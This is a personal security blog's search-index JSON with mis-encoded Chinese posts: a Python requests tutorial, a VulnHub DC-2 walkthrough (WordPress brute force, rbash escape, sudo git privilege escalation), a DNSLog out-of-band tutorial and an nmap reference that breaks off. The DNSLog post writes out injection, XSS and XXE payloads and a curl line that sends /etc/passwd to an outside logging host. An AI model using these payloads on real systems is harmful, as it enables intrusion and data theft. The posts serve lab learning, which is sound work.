{"meta":{"title":"Edsion's Blog","subtitle":"","description":"","author":"Edsion Shen","url":"http://yoursite.com","root":"/"},"pages":[{"title":"categories","date":"2020-05-25T05:26:43.868Z","updated":"2020-05-25T05:26:43.868Z","comments":true,"path":"categories/index.html","permalink":"http://yoursite.com/categories/index.html","excerpt":"","text":""},{"title":"about","date":"2020-05-25T05:40:33.763Z","updated":"2020-05-25T05:40:33.763Z","comments":true,"path":"about/index.html","permalink":"http://yoursite.com/about/index.html","excerpt":"","text":""},{"title":"tags","date":"2020-05-25T05:27:03.044Z","updated":"2020-05-25T05:27:03.044Z","comments":true,"path":"tags/index.html","permalink":"http://yoursite.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"requeståº“ä½¿ç”¨","slug":"requestsåº“","date":"2020-07-17T06:30:12.000Z","updated":"2020-07-17T06:31:54.418Z","comments":true,"path":"2020/07/17/requestsåº“/","link":"","permalink":"http://yoursite.com/2020/07/17/requests%E5%BA%93/","excerpt":"","text":"æ„é€ è¯·æ±‚ è¯·æ±‚å¤´ 12headers=&#123;'Accept': 'application/vnd.github.v3.text-match+json'&#125;res = requests.get(url,headers) getè¯·æ±‚ 123456res = requests.get(url='https://api.github.com/search/repositories')å‚æ•°# res = requests.get(url,params)# params=&#123;'q':'requests+language:python'&#125;# params=[('q', 'requests+language:python')]# params=b'q=requests+language:python' å…¶ä»–è¯·æ±‚æ–¹æ³• 12345678910&gt;&gt;&gt; requests.post('https://httpbin.org/post', data=&#123;'key':'value'&#125;)&gt;&gt;&gt; requests.put('https://httpbin.org/put', data=&#123;'key':'value'&#125;)&gt;&gt;&gt; requests.delete('https://httpbin.org/delete')&gt;&gt;&gt; requests.head('https://httpbin.org/get')&gt;&gt;&gt; requests.patch('https://httpbin.org/patch', data=&#123;'key':'value'&#125;)&gt;&gt;&gt; requests.options('https://httpbin.org/get')æ¶ˆæ¯ä½“# data=&#123;'key':'value'&#125;# data=[('key', 'value')&#125;# json=&#123;'key':'value'&#125; å“åº”å¤„ç† å“åº”çŠ¶æ€ç  1status = res.status_code å“åº”å¤´ä¿¡æ¯ï¼ˆé”®ä¸åˆ†å¤§å°å†™ï¼‰ 1requests_header=res.headers['content-type'] å“åº”å†…å®¹ å­—èŠ‚æ ¼å¼æŸ¥çœ‹å†…å®¹ 12data = res.content# b'&#123;\\n \"current_user_url\": \"https://api.github.com/user\",\\n \"cur å­—ç¬¦ä¸²æ ¼å¼æŸ¥çœ‹å†…å®¹ï¼ˆåºåˆ—åŒ–JSONï¼‰ 12345å› ä¸ºå¯¹ bytes è§£ç åˆ° str éœ€è¦ä¸€ä¸ªç¼–ç æ ¼å¼ï¼Œæ‰€ä»¥å¦‚æœä½ æ²¡æœ‰æŒ‡å®šï¼Œè¯·æ±‚å°†å°è¯•æ ¹æ®å“åº”å¤´æ¥çŒœæµ‹ç¼–ç æ ¼å¼res.encoding = 'utf-8'data=res.text# &#123;\"current_user_url\":\"https://api.github.com/user\",\"cur å­—å…¸å½¢å¼å†…å®¹ï¼ˆååºåˆ—åŒ–JSONï¼‰ 123456data=res.json()# &#123;'current_user_url': 'https://api.github.com/user', 'curinæå–å†…å®¹repository = data['items'][0]ä¹Ÿå¯ä»¥ä½¿ç”¨ .text è·å– str å¹¶ä½¿ç”¨json.loads() å¯¹å…¶è¿›è¡Œååºåˆ—åŒ–json.loads(data) å…¶ä»– æ£€æŸ¥è¯·æ±‚ 1234requests åº“ä¼šåœ¨å°†è¯·æ±‚å®é™…å‘é€åˆ°ç›®æ ‡æœåŠ¡å™¨ä¹‹å‰å‡†å¤‡è¯¥è¯·æ±‚ã€‚ è¯·æ±‚å‡†å¤‡åŒ…æ‹¬åƒéªŒè¯å¤´ä¿¡æ¯å’Œåºåˆ—åŒ–JSONå†…å®¹ç­‰response.request.headers['Content-Type']response.request.urlresponse.request.body èº«ä»½éªŒè¯ 1234567891011ä½¿ç”¨auth å‚æ•°ï¼Œrqeuests å°†ä½¿ç”¨HTTPçš„åŸºæœ¬è®¿é—®è®¤è¯æ–¹æ¡ˆæ¥åº”ç”¨å‡­æ®&gt;&gt;&gt; from getpass import getpass&gt;&gt;&gt; requests.get('https://api.github.com/user', auth=('username', getpass()))æˆåŠŸè¿”å›&lt;Response [200]&gt;ï¼Œå¤±è´¥è¿”å›&lt;Response [401]&gt;HTTPBasicAuthæ•ˆæœåŒä¸Š&gt;&gt;&gt; from requests.auth import HTTPBasicAuth&gt;&gt;&gt; from getpass import getpass&gt;&gt;&gt; requests.get('https://api.github.com/user', auth=HTTPBasicAuth('username', getpass()))requests ä¹Ÿæä¾›äº†å…¶ä»–èº«ä»½éªŒè¯æ–¹æ³•ï¼Œä¾‹å¦‚ HTTPDigestAuth å’Œ HTTPProxyAuth å…³é—­SSLè¯ä¹¦éªŒè¯ 1&gt;&gt;&gt; requests.get('https://api.github.com', verify=False) æ€§èƒ½ è¶…æ—¶ 123456789101112131415&gt;&gt;&gt; requests.get('https://api.github.com', timeout=1)è¿˜å¯ä»¥å°†å…ƒç»„ä¼ é€’ç»™ timeoutï¼Œç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯è¿æ¥è¶…æ—¶ï¼ˆå®ƒå…è®¸å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨å»ºç«‹è¿æ¥çš„æ—¶é—´ï¼‰ï¼Œç¬¬äºŒä¸ªå…ƒç´ æ˜¯è¯»å–è¶…æ—¶ï¼ˆä¸€æ—¦ä½ çš„å®¢æˆ·å·²å»ºç«‹è¿æ¥è€Œç­‰å¾…å“åº”çš„æ—¶é—´ï¼‰&gt;&gt;&gt; requests.get('https://api.github.com', timeout=(2, 5))è¶…æ—¶å¼‚å¸¸import requestsfrom requests.exceptions import Timeouttry: response = requests.get('https://api.github.com', timeout=1)except Timeout: print('The request timed out')else: print('The request did not time out') Sessionå¯¹è±¡ 1234567Session ç”¨äºè·¨è¯·æ±‚ä¿ç•™å‚æ•°ã€‚ ä¾‹å¦‚ï¼Œå¦‚æœè¦è·¨å¤šä¸ªè¯·æ±‚ä½¿ç”¨ç›¸åŒçš„èº«ä»½éªŒè¯,å½“ä½ çš„åº”ç”¨ç¨‹åºæƒ³è¦å†æ¬¡è¿æ¥åˆ°åŒä¸€æœåŠ¡å™¨æ—¶ï¼Œå®ƒå°†é‡ç”¨æ± ä¸­çš„è¿æ¥è€Œä¸æ˜¯å»ºç«‹æ–°è¿æ¥ã€‚import requestsfrom getpass import getpasswith requests.Session() as session: session.auth = ('username', getpass()) response = session.get('https://api.github.com/user') æœ€å¤§é‡è¯• 1234567891011121314151617é€šè¿‡ Transport Adaptersï¼Œä½ å¯ä»¥ä¸ºæ¯ä¸ªä¸ä¹‹äº¤äº’çš„æœåŠ¡å®šä¹‰ä¸€ç»„é…ç½®ã€‚ ä¾‹å¦‚ï¼Œå‡è®¾ä½ å¸Œæœ›æ‰€æœ‰å¯¹äºhttps://api.github.comçš„è¯·æ±‚åœ¨æœ€ç»ˆæŠ›å‡º ConnectionError ä¹‹å‰é‡è¯•ä¸‰æ¬¡ã€‚ ä½ å°†æ„å»ºä¸€ä¸ª Transport Adapterï¼Œè®¾ç½®å…¶ max_retries å‚æ•°ï¼Œå¹¶å°†å…¶è£…è½½åˆ°ç°æœ‰çš„ Sessionimport requestsfrom requests.adapters import HTTPAdapterfrom requests.exceptions import ConnectionErrorgithub_adapter = HTTPAdapter(max_retries=3)session = requests.Session()# Use `github_adapter` for all requests to endpoints that start with this URLsession.mount('https://api.github.com', github_adapter)try: session.get('https://api.github.com')except ConnectionError as ce: print(ce) ç»“å°¾ reåº“å‚è€ƒï¼šhttps://juejin.im/post/5d8c630e51882511f444f65b","categories":[{"name":"python","slug":"python","permalink":"http://yoursite.com/categories/python/"}],"tags":[{"name":"pythonåº“","slug":"pythonåº“","permalink":"http://yoursite.com/tags/python%E5%BA%93/"}]},{"title":"VulnHubæ¸—é€ä¹‹DC-2","slug":"VulnHubæ¸—é€ä¹‹DC-2","date":"2020-07-08T11:34:52.000Z","updated":"2020-07-08T11:34:47.378Z","comments":true,"path":"2020/07/08/VulnHubæ¸—é€ä¹‹DC-2/","link":"","permalink":"http://yoursite.com/2020/07/08/VulnHub%E6%B8%97%E9%80%8F%E4%B9%8BDC-2/","excerpt":"","text":"0Ã—00 è¯´æ˜ çŸ¥è¯†ç‚¹ï¼šWordPressã€å—é™shellã€gitææƒ kaliï¼š192.168.101.10 é¶æœºå’Œkaliå¤„äºåŒä¸€å±€åŸŸç½‘ 0x01 ä¿¡æ¯æ”¶é›† æ¢æµ‹ç›®æ ‡åœ°å€ å‘½ä»¤ï¼šarp-scan -l æˆ–è€… nmap -sP 192.168.101.0/24 é¶æœºåœ°å€ä¸º192.168.101.17 æ¢æµ‹ç›®æ ‡å¼€æ”¾ç«¯å£ å‘½ä»¤ï¼šnmap -sV -p- 192.168.101.17 é¶æœºå¼€æ”¾äº†80ç«¯å£å’Œ7744ç«¯å£ï¼Œ7744ä¸ºSSHï¼Œå…ˆè®¿é—®ä¸‹80 tsï¼šéœ€è¦å…ˆä¿®æ”¹hostsæ–‡ä»¶ï¼Œkaliä¸Šçš„hostsä½ç½®åœ¨ /etc/hosts 0x02 Flag1 è®¿é—®æˆåŠŸï¼Œä½¿ç”¨wappalyzeræŸ¥çœ‹ä¸‹ç½‘ç«™æ‰€ä½¿ç”¨çš„æŠ€æœ¯ ç½‘ç«™ä¸º WordPress CMSæ„å»ºï¼Œå¹¶ä¸”å‘ç°ç¬¬ä¸€ä¸ªflag 123456789Flag 1:Your usual wordlists probably wonâ€™t work, so instead, maybe you just need to be cewl.More passwords is always better, but sometimes you just canâ€™t win them all.Log in as one to see the next flag.If you canâ€™t find it, log in as another. æç¤ºä½¿ç”¨cewlå·¥å…·ï¼Œå¹¶ä¸”åªæœ‰ç™»é™†ä¹‹åæ‰èƒ½çœ‹åˆ°ä¸‹ä¸€ä¸ªflag 0x03 Flag2 cewlå·¥å…·å¯ä»¥æ ¹æ®urlæ¥ç”Ÿæˆå¯¹åº”çš„å¯†ç å­—å…¸ å‘½ä»¤ï¼šcewl -w /root/dic/dc2_passwd.txt http://dc-2/ æœ‰äº†å¯†ç ï¼Œæ¥ä¸‹æ¥ä½¿ç”¨wpscanï¼Œå®ƒå¯ä»¥æŸ¥è¯¢å‡ºwordpressçš„ç”¨æˆ·åï¼Œ-e uæ˜¯æšä¸¾ç”¨æˆ·åï¼Œé»˜è®¤ä»1-10 å‘½ä»¤ï¼šwpscan --url http://dc-2/ -e u æ¥ä¸‹æ¥ï¼Œæ‰¾å‡º WordPress ç™»é™†åœ°å€ï¼Œå¯ä»¥ç½‘ä¸ŠæŸ¥æ‰¾æˆ–è€…å·¥å…·å»æ‰«æ å·¥å…·å¯ä»¥ç”¨dirbï¼Œå‘½ä»¤ï¼šdirb http://dc-2/ å­—å…¸åœ°å€éƒ½å…·å¤‡äº†ï¼Œä½¿ç”¨wpscanè¿›è¡Œçˆ†ç ´ å‘½ä»¤ï¼šwpscan --url http://dc-2/wp-admin -U /root/dic/dc2_username.txt -P /root/dic/dc2_passwd.txt çˆ†ç ´æˆåŠŸï¼Œç»“æœå¦‚ä¸‹ï¼š 123[!] Valid Combinations Found: | Username: jerry, Password: adipiscing | Username: tom, Password: parturient ä½¿ç”¨ jerry ç™»é™†ï¼Œæ‰¾åˆ°äº†flag2 12345Flag 2:If you can&#39;t exploit WordPress and take a shortcut, there is another way.Hope you found another entry point. æ„æ€æ˜¯ï¼ŒWordPressè¡Œä¸é€šå°±æ¢ä¸ªæ–¹å¼ 0x04 Flag3 äºæ˜¯æƒ³åˆ°ä¹‹å‰è¿˜æœ‰ä¸ªSSHæœåŠ¡ï¼Œä¾¿å°è¯•ç™»é™†ï¼Œå‘ç°jerryæ— æ³•ç™»å½•ï¼Œtomå¯ä»¥ ls å‘ç° flag3.txt åœ¨å½“å‰ç›®å½•ä¸‹ï¼Œä½†æ˜¯ä½¿ç”¨ cat å´æç¤º -rbash: cat: command not found è¿™æ˜¯ä¸€ä¸ªå—é™shellç¯å¢ƒï¼Œå¸¸è§çš„å—é™shellç¯å¢ƒç±»å‹åŒ…æ‹¬rbashã€rkshå’Œrshï¼Œäºæ˜¯ç°åœ¨éœ€è¦ç»•è¿‡rbashï¼Œcompgenè¿˜èƒ½ä½¿ç”¨ï¼ŒæŸ¥çœ‹ä¸‹å½“å‰å¯ä»¥æ‰§è¡Œçš„å‘½ä»¤ å‘½ä»¤ï¼šcompgen -c å—é™shellæ˜¯LinuxShellé™åˆ¶ä¸€äº›bash shellä¸­çš„åŠŸèƒ½ï¼Œå¹¶ä¸”æ˜¯ä»åå­—ä¸Šå¾ˆæ¸…æ¥šã€‚ è¯¥é™åˆ¶å¾ˆå¥½åœ°å®ç°&gt; äº†å‘½ä»¤ä»¥åŠè„šæœ¬åœ¨å—é™shellä¸­è¿è¡Œã€‚ å®ƒä¸ºLinuxä¸­çš„bash shellæä¾›äº†ä¸€ä¸ªé¢å¤–çš„å®‰å…¨å±‚ã€‚ å¤§æ¦‚æ¸…æ¥šäº†ï¼ŒæŸ¥çœ‹å½“å‰ç¯å¢ƒå˜é‡ï¼šecho $PATHï¼Œå‘ç°ä½äº/home/tom/usr/binä¸‹ï¼Œç”¨viè½¬ä¹‰å—é™åˆ¶çš„shellï¼š 123vi:set shell&#x3D;&#x2F;bin&#x2F;bash:shell ç„¶åè®¾ç½®ç¯å¢ƒå˜é‡ï¼š 12export PATH&#x3D;&#x2F;bin:&#x2F;usr&#x2F;bin:$PATHexport SHELL&#x3D;&#x2F;bin&#x2F;bash:$SHELL æˆåŠŸç»•è¿‡rbashï¼Œå¹¶è¯»å–äº†flag3.txtçš„å†…å®¹ 1Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes. å®é™…ä¸Šï¼Œæ˜¯è¦è®©æˆ‘ä»¬åˆ‡æ¢ jerry ç”¨æˆ· 0x05 Flag4 ä½¿ç”¨su jerryåˆ‡æ¢ jerry ç”¨æˆ·ï¼Œå›åˆ°jerryçš„å®¶ç›®å½•æŸ¥çœ‹ï¼Œå‘ç°äº†flag4 1234567Good to see that you&#39;ve made it this far - but you&#39;re not home yet. You still need to get the final flag (the only flag that really counts!!!). No hints here - you&#39;re on your own now. :-)Go on - git outta here!!!! å‘Šè¯‰æˆ‘ä»¬åªå·®æœ€åä¸€ä¸ªflagäº†ï¼Œè¿˜æç¤ºäº† git 0x06 Flag5 å…¶å®æ˜¯ä½¿ç”¨gitè¿›è¡Œææƒ 12sudo git help config!&#x2F;bin&#x2F;bash æ‹¿åˆ°æœ€åçš„ flag .","categories":[{"name":"æ¸—é€","slug":"æ¸—é€","permalink":"http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"VulnHub","slug":"VulnHub","permalink":"http://yoursite.com/tags/VulnHub/"}]},{"title":"é€šè¿‡DNSLogè·å–æ— å›æ˜¾ä¿¡æ¯","slug":"DNSLog","date":"2020-07-04T13:32:36.000Z","updated":"2020-07-04T14:15:22.583Z","comments":true,"path":"2020/07/04/DNSLog/","link":"","permalink":"http://yoursite.com/2020/07/04/DNSLog/","excerpt":"","text":"0x01 åŸç† NSï¼ˆName Serverï¼‰è®°å½•æ˜¯åŸŸåæœåŠ¡å™¨è®°å½•ï¼Œç”¨æ¥æŒ‡å®šè¯¥åŸŸåç”±å“ªä¸ªDNSæœåŠ¡å™¨æ¥è¿›è¡Œè§£æ DNSï¼šåŸŸåè§£ææœåŠ¡å™¨ Aè®°å½•ï¼šæŒ‡å®šåŸŸåå¯¹åº”çš„IPåœ°å€ ä¸€å¥è¯å½’çº³ğŸ˜ªğŸ˜ªï¼š å°†éœ€è¦æŸ¥è¯¢çš„å€¼å’ŒåŸŸåæ‹¼æ¥èµ·æ¥ï¼Œå‘åŸŸåå‘é€è¯·æ±‚ï¼ŒDNSåœ¨è§£æçš„æ—¶å€™ä¼šç•™ä¸‹æ—¥å¿—ï¼Œè¯»å–æ—¥å¿—ä¾¿å¯ä»¥è·å–ä¿¡æ¯ã€‚ æ¡ˆä¾‹è§£é‡Š 12ping &#96;whoami&#96;.test.com &#x2F;&#x2F;å‘å‡ºè¯·æ±‚ping root.test.com &#x2F;&#x2F;å®é™…è¯·æ±‚ whoamiåœ¨å‘½ä»¤è¡Œä¸­å°±è‡ªåŠ¨è§£æäº†ï¼Œæ‰€ä»¥å…¶å®æ˜¯å‘root.test.comå‘å‡ºçš„è¯·æ±‚ï¼Œè¿™æ—¶å°±ä¼šè¢«DNSæœåŠ¡å™¨æ‰€æ•è·ï¼Œæˆ‘ä»¬å°±èƒ½ä»æ—¥å¿—ä¸­è·å–å‘½ä»¤æ‰§è¡Œåçš„ç»“æœäº†ã€‚é‚£åˆ°åº•æ€ä¹ˆåˆ©ç”¨DNSLogè¿›è¡Œæ³¨å…¥å‘¢ï¼Ÿå…¶å®åªè¦æ˜¯èƒ½å¤Ÿå‘å‡ºè¯·æ±‚çš„åœ°æ–¹éƒ½å¯ä»¥ç”¨è¿™ç§æ–¹å¼è·å–æ•°æ®ã€‚ 0x02 DNSLogå¹³å° ä¸€ã€åœ¨çº¿å¹³å°ï¼šhttp://ceye.ioã€http://www.dnslog.cn äºŒã€è‡ªå·±æ­å»ºDNSLogæœåŠ¡å™¨ï¼šhttps://github.com/BugScanTeam/DNSLog ä¸‰ã€ BurpSuite collaborator ç‚¹å‡»Copy to Clipboardè·å–ä¸€ä¸ªæ ‡è¯† æ¯”å¦‚æˆ‘è¿™é‡Œè·å–åˆ°çš„å°±æ˜¯s6z9p5lykbxh0m8wx3vy44qg278xwm.burpcollaborator.net ç„¶åç”¨è¿™ä¸ªå¤–å¸¦å°±è¡Œäº† 0x03 DNSLogå¸¸ç”¨åœºæ™¯ SQLç›²æ³¨ å‘½ä»¤æ‰§è¡Œï¼ˆæ— å›æ˜¾ï¼‰ XSSï¼ˆæ— å›æ˜¾ï¼‰ SSRF(æ— å›æ˜¾) SQLç›²æ³¨ ä»¥MySQLä¸ºä¾‹ï¼Œåœ¨MySQLä¸­æœ‰ä¸ªä¸€ä¸ªload_fileå‡½æ•°å¯ä»¥ç”¨æ¥è¯»å–æœ¬åœ°çš„æ–‡ä»¶ã€‚å‰ææ˜¯rootæƒé™ã€‚ show variables like â€˜%secure%â€™;æŸ¥çœ‹load_file()å¯ä»¥è¯»å–çš„ç£ç›˜ã€‚ å½“secure_file_privä¸ºç©ºï¼Œå°±å¯ä»¥è¯»å–ç£ç›˜çš„ç›®å½•ã€‚ å½“secure_file_privä¸ºE:\\ï¼Œå°±å¯ä»¥è¯»å–Eç›˜çš„æ–‡ä»¶ã€‚ å½“secure_file_privä¸ºnullï¼Œload_fileå°±ä¸èƒ½åŠ è½½æ–‡ä»¶ã€‚ âš ï¸ æ³¨æ„ï¼šload_fileå‡½æ•°åœ¨Linuxä¸‹æ˜¯æ— æ³•ç”¨æ¥åšdnslogæ”»å‡»çš„ï¼Œå› ä¸ºåœ¨è¿™é‡Œå°±æ¶‰åŠåˆ°Windowsâ€”â€”UNCè·¯å¾„ã€‚ UNCè·¯å¾„ï¼šUNCæ˜¯ä¸€ç§å‘½åæƒ¯ä¾‹, ä¸»è¦ç”¨äºåœ¨Microsoft Windowsä¸ŠæŒ‡å®šå’Œæ˜ å°„ç½‘ç»œé©±åŠ¨å™¨. UNCå‘½åæƒ¯ä¾‹æœ€å¤šè¢«åº”ç”¨äºåœ¨å±€åŸŸç½‘ä¸­è®¿é—®æ–‡ä»¶æœåŠ¡å™¨æˆ–è€…æ‰“å°æœºã€‚æˆ‘ä»¬æ—¥å¸¸å¸¸ç”¨çš„ç½‘ç»œå…±äº«æ–‡ä»¶å°±æ˜¯è¿™ä¸ªæ–¹å¼ã€‚ å¹³å¸¸åœ¨Widnowsä¸­ç”¨å…±äº«æ–‡ä»¶çš„æ—¶å€™å°±ä¼šç”¨åˆ°è¿™ç§ç½‘ç»œåœ°å€çš„å½¢å¼ï¼š\\\\sss.xxx\\test\\ è¿™ä¹Ÿå°±è§£é‡Šäº†ä¸ºä»€ä¹ˆCONCAT()å‡½æ•°æ‹¼æ¥äº†4ä¸ª\\äº†ï¼Œå› ä¸ºè½¬ä¹‰çš„åŸå› ï¼Œ4ä¸ªå°±å˜\\æˆäº†2ä¸ª\\ï¼Œç›®çš„å°±æ˜¯åˆ©ç”¨UNCè·¯å¾„ã€‚ âš ï¸ å¦‚æœæŸ¥è¯¢çš„æ•°æ®ä¸­å‡ºç°äº†éå­—æ¯æ•°å­—çš„ç‰¹æ®Šå­—ç¬¦ï¼Œéœ€è¦è¿›è¡Œè½¬ä¹‰ï¼Œè¿™é‡Œç”¨16è¿›åˆ¶ã€‚åŸå› æ˜¯å¦‚æœå‡ºç°å¦‚é€—å·ï¼Œ@ç¬¦å·ç­‰ç‰¹æ®Šç¬¦å·ï¼Œä¸èƒ½å½¢æˆæ ‡å‡†çš„dnsåŸŸåï¼Œæ— æ³•å‘å‡ºæ•°æ®ã€‚ å‡ ä¸ªä¾‹å­ 123456ç›´æ¥è¯»å–http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\\\\\&#39;,(select database()),&#39;.4do468.ceye.io\\\\abc&#39;))),1,0)%23hexè½¬ç http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\\\\\&#39;,(select hex(user())),&#39;.4do468.ceye.io\\\\abc&#39;))),1,0)%23å–æ•°æ®http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1&#39; and if((select load_file(concat(&#39;\\\\\\\\&#39;,(select hex(concat(username,0x7e,password,0x7e)) from security.users limit 0,1),&#39;.4do468.ceye.io\\\\abc&#39;))),1,0)%23 å‘½ä»¤æ‰§è¡Œ Windowsä¸‹ æŸ¥çœ‹è®¡ç®—æœºåï¼Œå…¶ä»–ç±»ä¼¼ 1ping %COMPUTERNAME%.xxx.ceye.io Linuxä¸‹ æŸ¥çœ‹å½“å‰ç”¨æˆ·å’Œpasswdæ–‡ä»¶ï¼Œå…¶ä»–ç±»ä¼¼ 12curl http:&#x2F;&#x2F;ip.port.xxx.ceye.io&#x2F;&#96;whoami&#96;curl http:&#x2F;&#x2F;ip.port.xxoo.ceye.io&#x2F;&#96;cat &#x2F;etc&#x2F;passwd&#96; XSS é€šè¿‡ç›²æ‰“ï¼Œè®©è§¦å‘è€…æµè§ˆå™¨è®¿é—®é¢„è®¾è‡³çš„é“¾æ¥åœ°å€ï¼Œå¦‚æœç›²æ‰“æˆåŠŸï¼Œä¼šåœ¨å¹³å°ä¸Šæ”¶åˆ°å¦‚ä¸‹çš„é“¾æ¥è®¿é—®è®°å½•ï¼š 1payload:&gt;&lt;img src&#x3D;http:&#x2F;&#x2F;xss.xxxx.ceye.io&#x2F;aaa&gt; SSRF payload: 12345&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;ip.port.xxx.ceye.io&#x2F;aa&quot;&gt;%remote;]&gt;&lt;root&#x2F;&gt; 0x04 æ€»ç»“ æœ‰äº›å‡½æ•°çš„ä½¿ç”¨å…·æœ‰æ“ä½œç³»ç»Ÿçš„é™åˆ¶ã€‚ DNSæŸ¥è¯¢æœ‰é•¿åº¦é™åˆ¶ï¼Œæ‰€ä»¥å¿…è¦çš„æ—¶å€™éœ€è¦å¯¹æŸ¥è¯¢ç»“æœåšå­—ç¬¦ä¸²çš„åˆ‡å‰²ã€‚ é¿å…ä¸€äº›ç‰¹æ®Šç¬¦å·çš„äº§ç”Ÿï¼Œæœ€å¥½çš„é€‰æ‹©å°±æ˜¯æ•°æ®å…ˆç¼–ç å†å¸¦å‡ºã€‚ æ³¨æ„ä¸åŒæ•°æ®åº“çš„è¯­æ³•æ˜¯æœ‰å·®å¼‚çš„ï¼Œç‰¹åˆ«æ˜¯åœ¨æ•°æ®åº“æ‹¼æ¥çš„æ—¶å€™ã€‚ æœ‰äº›æ“ä½œæ˜¯éœ€è¦è¾ƒé«˜çš„æƒé™ã€‚ ğŸŒˆğŸŒˆ åˆ©ç”¨DNSLogæ”»å‡»çš„æ–¹æ³•ï¼Œèƒ½æ›´åŠ ç®€ä¾¿ã€é«˜æ•ˆçš„è¿›è¡Œæ¸—é€æµ‹è¯•ï¼Œå¹¶ä¸”æ‹¥æœ‰è¶³å¤Ÿæƒé™ï¼Œå¯ä»¥ç›´æ¥æ‹¿ä¸‹ç›®æ ‡ç«™ç‚¹ã€‚","categories":[{"name":"æ¸—é€","slug":"æ¸—é€","permalink":"http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"æŠ€å·§","slug":"æŠ€å·§","permalink":"http://yoursite.com/tags/%E6%8A%80%E5%B7%A7/"}]},{"title":"NMAPçš„ä½¿ç”¨","slug":"Nmapä½¿ç”¨","date":"2020-06-27T06:53:22.000Z","updated":"2020-06-27T06:53:43.929Z","comments":true,"path":"2020/06/27/Nmapä½¿ç”¨/","link":"","permalink":"http://yoursite.com/2020/06/27/Nmap%E4%BD%BF%E7%94%A8/","excerpt":"","text":"nampç«¯å£çŠ¶æ€ 123456Open(å¼€æ”¾çš„): åº”ç”¨ç¨‹åºæ­£åœ¨è¿™ä¸ªç«¯å£ä¸Šç›‘å¬è¿æ¥ã€‚losed(å…³é—­çš„): ç«¯å£å¯¹æ¢æµ‹åšå‡ºäº†å“åº”ï¼Œä½†æ˜¯ç°åœ¨æ²¡æœ‰åº”ç”¨ç¨‹åºåœ¨ç›‘å¬è¿™ä¸ªç«¯å£ã€‚Filtered(è¿‡æ»¤çš„): ç«¯å£æ²¡æœ‰å¯¹æ¢æµ‹åšå‡ºå“åº”ã€‚åŒæ—¶å‘Šè¯‰æˆ‘ä»¬æ¢é’ˆå¯èƒ½è¢«ä¸€äº›è¿‡æ»¤å™¨ï¼ˆé˜²ç«å¢™ï¼‰ç»ˆæ­¢äº†ã€‚Unfiltered(æœªè¢«è¿‡æ»¤çš„):ç«¯å£å¯¹æ¢æµ‹åšå‡ºäº†å“åº”ï¼Œä½†æ˜¯Nmapæ— æ³•ç¡®å®šå®ƒä»¬æ˜¯å…³é—­è¿˜æ˜¯å¼€æ”¾ã€‚Open/Filtered: ç«¯å£è¢«è¿‡æ»¤æˆ–è€…æ˜¯å¼€æ”¾çš„ï¼ŒNmapæ— æ³•åšå‡ºåˆ¤æ–­ã€‚Closed/Filtered: ç«¯å£è¢«è¿‡æ»¤æˆ–è€…æ˜¯å…³é—­çš„ï¼ŒNmapæ— æ³•åšå‡ºåˆ¤æ–­ã€‚ TCPæ ‡å¿—ä½ 123456SYN(synchronouså»ºç«‹è”æœº)ACK(acknowledgement ç¡®è®¤)PSH(pushä¼ é€)FIN(finishç»“æŸ)RST(reseté‡ç½®)URG(urgentç´§æ€¥) nmapå¸¸ç”¨å‘½ä»¤ è½»é‡çº§æ‰«æï¼š 1234567nmap -sP 192.168.0.0/24 åˆ¤æ–­å“ªäº›ä¸»æœºå­˜æ´»nmap -sT 192.168.0.3 å¼€æ”¾äº†å“ªäº›ç«¯å£nmap -sS 192.168.0.127 å¼€æ”¾äº†å“ªäº›ç«¯å£ï¼ˆéšè”½æ‰«æï¼‰nmap -sU 192.168.0.127 å¼€æ”¾äº†å“ªäº›ç«¯å£ï¼ˆUDPï¼‰nmap -sS -O 192.168.0.127 æ“ä½œç³»ç»Ÿè¯†åˆ«nmap -sT -p 80 -oG â€“ 192.168.1.* | grep openåˆ—å‡ºå¼€æ”¾äº†æŒ‡å®šç«¯å£çš„ä¸»æœºåˆ—è¡¨nmap -sV -p 80 thief.one åˆ—å‡ºæœåŠ¡å™¨ç±»å‹(åˆ—å‡ºæ“ä½œç³»ç»Ÿï¼Œå¼€å‘ç«¯å£ï¼ŒæœåŠ¡å™¨ç±»å‹,ç½‘ç«™è„šæœ¬ç±»å‹ç­‰) æ‰¹é‡æ‰«æï¼š 123nmap -sT -sV -O -P0 --open -n -oN result.txt -p80-89,8080-8099,8000-8009,7001-7009,9000-9099,21,443,873,2601,2604,3128,4440,6082,6379,8888,3389,9200,11211,27017,28017,389,8443,4848,8649,995,9440,9871,2222,2082,3311,18100,9956,1433,3306,1900,49705,50030,7778,5432,7080,5900,50070,5000,5560,10000 -iL ip.txtnmap -sT -sV -p80-89,8080-8099,8000-8009,7001-7009,9000-9099,21,443,873,2601,2604,3128,4440,6082,6379,8888,3389,9200,11211,27017,28017,389,8443,4848,8649,995,9440,9871,2222,2082,3311,18100,9956,1433,3306,1900,49705,50030,7778,5432,7080,5900,50070,5000,5560,10000 --open --max-hostgroup 10 --max-parallelism 10 --max-rtt-timeout 1000ms --host-timeout 800s --max-scan-delay 2000ms -iL ~/Desktop/ip.txt -oN ~/Desktop/result/result.txt nmapå‚æ•° 1234567891011121314151617181920212223242526272829303132333435nmap [Scan Type(s)] [Options] &#123;target specification&#125;scan type(s) ç”¨äºæŒ‡å®šæ‰«æç±»å‹options ç”¨äºæŒ‡å®šé€‰é¡¹target specification ç”¨äºæŒ‡å®šæ‰«æç›®æ ‡-s æŒ‡å®šæ‰«æç±»å‹å¦‚ä¸‹ï¼š-sP (pingæ‰«æ) *å­˜æ´»ä¸»æœºæ¢æµ‹-sS (TCP SYNæ‰«æ éšèº«æ‰«æ) *é»˜è®¤æ‰«ææ–¹å¼ï¼Œä½¿ç”¨é¢‘ç‡æœ€é«˜çš„åŠå¼€æ”¾æ‰«æ-sT (tcp 